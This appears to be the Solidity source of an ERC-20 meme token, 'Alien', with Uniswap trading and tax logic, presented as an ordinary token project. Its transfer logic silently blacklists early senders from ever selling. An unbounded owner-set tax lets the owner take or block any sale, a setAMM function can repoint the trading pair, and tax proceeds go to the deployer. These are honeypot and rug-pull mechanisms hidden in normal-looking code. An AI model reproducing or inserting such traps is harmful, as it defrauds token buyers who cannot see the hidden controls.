// SPDX-License-Identifier: MIT

/**
Telegram: https://t.me/alien_eth
Twitter: https://twitter.com/alien_erc
Website: https://alientoken.xyz/
**/
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract Alien is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => bool) blacklist;
    bool public transferDelayEnabled = true;
    address payable private _taxWallet;

    string private constant _name = unicode"Alien";
    string private constant _symbol = unicode"ALIEN";

    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 51000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 1020 * 10 ** _decimals;
    uint256 public _maxWalletSize = 1020 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 1020 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1020 * 10 ** _decimals;

    uint256 private _tax = 20;
    bool private _taxIsRandom = false;
    uint256 private constant _preventSwapBefore = 5;
    uint256 private _buyCount = 0;

    uint256 private initialBlock = 0;
    bool private blacklistDone = false;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event Tax(address from, address to, uint256 taxAmount, uint256 tax);
    event TaxInfo(uint256 tax);
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event PairCreated(address pair);
    event LiquidityAdded();
    event Blacklisted(address from);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setTax(uint256 new_tax) public onlyOwner {
        _tax = new_tax;
    }

    function getTax() public view onlyOwner returns (uint256) {
        return _tax;
    }

    function randomTax() public onlyOwner {
        _taxIsRandom = true;
    }

    function getInitialBlock() public view onlyOwner returns (uint256) {
        return initialBlock;
    }

    function getCurrentBlock() public view returns (uint256) {
        return block.number;
    }

    function calculateCurrentTax() private view returns (uint256) {
        uint256 endswith = block.number % 10;

        uint256 tax = 0;
        if (endswith == 0) {
            tax = 5;
        } else if (endswith == 1) {
            tax = 0;
        } else if (endswith == 2) {
            tax = 1;
        } else if (endswith == 3) {
            tax = 2;
        } else if (endswith == 4) {
            tax = 3;
        } else if (endswith == 5) {
            tax = 4;
        } else if (endswith == 6) {
            tax = 4;
        } else if (endswith == 7) {
            tax = 3;
        } else if (endswith == 8) {
            tax = 2;
        } else if (endswith == 9) {
            tax = 1;
        }

        return tax;
    }

    function revertRandomTax() public onlyOwner {
        _taxIsRandom = false;
        _tax = 20;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if ((initialBlock != 0) && (initialBlock + 1 < block.number)) {
            blacklistDone = true;
        }

        if (_taxIsRandom) {
            _tax = calculateCurrentTax();
        }

        uint256 currentTax = _tax;

        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (!blacklistDone) {
                // if we are still blacklisting check if we have already blacklisted the from address
                // if we haven't, blacklist it
                if (!blacklist[from]) {
                    blacklist[from] = true;
                    emit Blacklisted(from);
                }
            }

            // buying tax
            taxAmount = amount.mul(currentTax).div(100);

            // buying
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            // selling
            if (to == uniswapV2Pair && from != address(this)) {
                // Prevent selling for those that are blacklisted
                require(!blacklist[from], "Blacklisted.");

                // selling tax
                taxAmount = amount.mul(currentTax).div(100);
            }

            // this is a normal transfer, we don't want to allow blacklisted to do that
            if (from != uniswapV2Pair && to != uniswapV2Pair) {
                // prevent tx for blacklisted
                require(!blacklist[from], "Blacklisted.");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 50000000000000000) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Tax(from, address(this), taxAmount, currentTax);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function openTrading(address routerAddr) external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(routerAddr); // https://github.com/Uniswap/universal-router/blob/main/deploy-addresses/mainnet.json
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        emit PairCreated(uniswapV2Pair);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        emit LiquidityAdded();
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        IERC20(uniswapV2Pair).transfer(
            address(owner()),
            IERC20(uniswapV2Pair).balanceOf(address(this))
        );
        swapEnabled = true;
        initialBlock = block.number;
        tradingOpen = true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setAMM(address newAMMPair) external onlyOwner {
        uniswapV2Pair = newAMMPair;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function removeTax() external onlyOwner {
        _tax = 0;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}
